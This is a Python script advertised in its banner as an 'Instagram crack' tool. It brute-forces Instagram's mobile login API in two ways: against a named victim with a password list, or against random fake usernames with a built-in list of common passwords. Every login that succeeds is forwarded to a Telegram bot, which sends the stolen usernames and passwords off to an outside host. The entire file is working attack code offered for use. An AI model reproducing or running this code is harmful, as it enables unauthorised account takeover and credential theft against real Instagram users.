import os
try:
    import requests
    import uuid
    import random
    from faker import Faker
except ModuleNotFoundError:
    os.system('pip install uuid requests faker')

uid = str(uuid.uuid4())
DvD = "android-" + str(uuid.uuid4())

# Colors
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # Red
X = '\033[1;33m'  # Yellow
Z1 = '\033[2;31m'  # Second red
F = '\033[2;32m'  # Green
A = '\033[2;34m'  # Blue
C = '\033[2;35m'  # Pink
B = '\x1b[38;5;208m'  # Orange
Y = '\033[1;34m'  # Light blue
M = '\x1b[1;37m'  # White
S = '\033[1;33m'
U = '\x1b[1;37m'  # White
SM='\x1b[34m'  #سمائي
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'

print(f'''

{Y}                   
　　　　　／＞　　フ
　　　　　| 　_　 _ l
　 　　　／` ミ＿xノ
　　 　 /　　　 　 |
　　　 /　 ヽ　　 ﾉ
　 　 │　　| | |            𝐁𝐲 : sᴀᴋᴏ

{F}=============================
{B}[{E}+{B}] {F}GitHub  : sak0r 
{B}[{E}+{B}] {F}TeleGram  : VD_DK    
{B}[{E}+{B}] {F}Instagram  : V9_4O 
{B}[{E}+{B}] {F}Tool  : Instagram crack 
=============================
      ''')

token = input(f' {F}({C}۞ {F}) {Y} Enter Token{E}  ')



ID = input(f' {F}({C}✦ {F}) {Y} Enter ID{E}  ')
os.system('clear')

Start = (f'''
How To Use :
=============================
[1] Put Your Bot Token
[2] Put Your Telegram ID
[3] Chose An Option (1.Specific/2.Random)
[3.1] Specific : Put The Username Of The Victim And The Password List
[3.2] Random : Start Checking automatically =============================
ʙʏ : sᴀᴋᴏ
''')
requests.post(
                        f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(Start))
                        
def linked():
    sg = input(
        f'''

[{C}★ {B}]═══════════════════════════   
              
{F}[1] 𝐒𝐩𝐞𝐜𝐢𝐟𝐢𝐜

[{C}★ {B}]═════════════════════════════

{BYellow}[2] 𝐑𝐚𝐧𝐝𝐨𝐦

[{C}★ {B}]═════════════════════════════

{B} [{C}⌯{B}] {C} {E}» ''')

    if sg == '1':
        saiko()
    elif sg == '2':
        bruh()

def saiko():
    email = input(f'{X}[+] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦 𝐨𝐟 𝐭𝐡𝐞 𝐯𝐢𝐜𝐭𝐢𝐦: ')
    print(f'{M}_' *60)
    file = input(f'{A}[+] 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 𝐥𝐢𝐬𝐭: ')
    try:
        with open(file, "r") as f:
            for line in f:
                psw = line.strip()
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                           'Accept': '*/*',
                           'Cookie': 'missing',
                           'Accept-Encoding': 'gzip, deflate',
                           'Accept-Language': 'en-US',
                           'X-IG-Capabilities': '3brTvw==',
                           'X-IG-Connection-Type': 'WIFI',
                           'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                           'Host': 'i.instagram.com'}
                data = {'uuid': uid, 'password': psw,
                        'username': email,
                        'device_id': DvD,
                        'from_reg': 'false',
                        '_csrftoken': 'missing',
                        'login_attempt_countn': '0'}
                req = requests.post(url, headers=headers, data=data).json()
                if 'logged_in_user' in req:
                    print(f'{F}𝐆𝐎𝐎𝐃 ==> {email} | {psw}')
                    tlg = (f'''
            𝐓𝐡𝐞 𝐂𝐚𝐭 𝐅𝐢𝐧𝐝 𝐚 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 !
  ⋘─────━*𝐒𝐀𝐊𝐎*━─────⋙
𝐔𝐬𝐞𝐫 >> {email}
<><><><><><><><><><><><>            
𝐏𝐚𝐬𝐬 >> {psw}
<><><><><><><><><><><><>            

⋘─────━𝐒𝐀𝐊𝐎━─────⋙
            ''')
                    requests.post(
                        f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(tlg))
                else:
                    print(f'{E}𝐍𝐎𝐓 𝐆𝐎𝐎𝐃 ==> {email} | {psw}')
    except FileNotFoundError:
        print(f"𝐓𝐡𝐞 𝐂𝐚𝐭 𝐂𝐨𝐮𝐥𝐝 𝐍𝐨𝐭 𝐅𝐢𝐧𝐝 𝐓𝐡𝐞 𝐅𝐢𝐥𝐞 :{E}{file} ")

def bruh():
    while True:
        fake = Faker()
        email = fake.user_name()
        BBTC = [
        '1234567890', '1111111', '000000', '1234567', '123456', '0987654321', '77777777', '2006', '1092', 'qweasdzx',
        'zxcvbnm', 'vcxzsawq', 'polkmn', 'username', 'iloveyou', 'admin123', 'baybay', 'password', '20032003',
        '19901990', '20092009', '20082008', '20002000', '19981998', '90909090', '10101010', '10001000', 'zzxxzzxx',
        'ppooiiuu', 'mmnnbbvv', 'firstlast', '19971997', '20052005', '19991999', '123451234', 'zxcvzxcv',
        '1234512345@12345', 'qqqqwwww', 'qqwweerr', 'zzzzxxxx', '١٢٣٤٥٦', '١٢٣٤٥٦٧٨٩', '1122334455@@', 'Aa123456',
        'mmmmnnnn', 'nnnnmmmm', 'mmnnbbvv', 'zzzzxxxx', 'zzxxccvv', 'qqwweerr', '1234512345@12345', '123@123',
        '1234512345', '123412345', '1234554321', '00998877', '123456123456', '1122334455', '1q2w3e4r5t',
        '1q2w3e4r5t6y', '20202020', '20222022', 'aassddff', '10203040', '1020304050',
        'Anaahmed123', 'Mira777', 'Khaled1999', 'Khaled1997', 'Khaled1998', 'Khaled1996', 'Khaled1995', '102030405060',
        '1q2w3e4r5t', 'qwertyuiop', 'qwertyuiopasdfghjkl'
    ]
        psw = random.choice(BBTC)
        url = 'https://i.instagram.com/api/v1/accounts/login/'
        headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                   'Accept': '*/*',
                   'Cookie': 'missing',
                   'Accept-Encoding': 'gzip, deflate',
                   'Accept-Language': 'en-US',
                   'X-IG-Capabilities': '3brTvw==',
                   'X-IG-Connection-Type': 'WIFI',
                   'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                   'Host': 'i.instagram.com'}
        data = {'uuid': uid, 'password': psw,
                'username': email,
                'device_id': DvD,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'}
        req = requests.post(url, headers=headers, data=data).json()
        if 'logged_in_user' in req:
            print(f'''{F} [Δ] 𝐆𝐎𝐎𝐃 ==> {email} | {psw}
            𝐓𝐡𝐞 𝐂𝐚𝐭 𝐅𝐢𝐧𝐝 𝐚 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 !
⋘─────━*𝐒𝐀𝐊𝐎*━─────⋙
𝐔𝐬𝐞𝐫 >> {email}
<><><><><><><><><><><><>            
𝐏𝐚𝐬𝐬 >> {psw}
<><><><><><><><><><><><>            
𝖡𝗒 : sᴀᴋᴏ
⋘─────━𝐒𝐀𝐊𝐎━─────⋙


''')
            tlg = (f'''
            𝐓𝐡𝐞 𝐂𝐚𝐭 𝐅𝐢𝐧𝐝 𝐚 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 !
            ⋘─────━*𝐒𝐀𝐊𝐎*━─────⋙
𝐔𝐬𝐞𝐫 >> {email}
<><><><><><><><><><><><>            
𝐏𝐚𝐬𝐬 >> {psw}
<><><><><><><><><><><><>            

⋘─────━𝐒𝐀𝐊𝐎━─────⋙
            ''')
            requests.post(
                f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(tlg))
        else:
            print(f'{E} [Δ] 𝐍𝐎𝐓 𝐆𝐎𝐎𝐃 ==> {email} | {psw}')


linked()
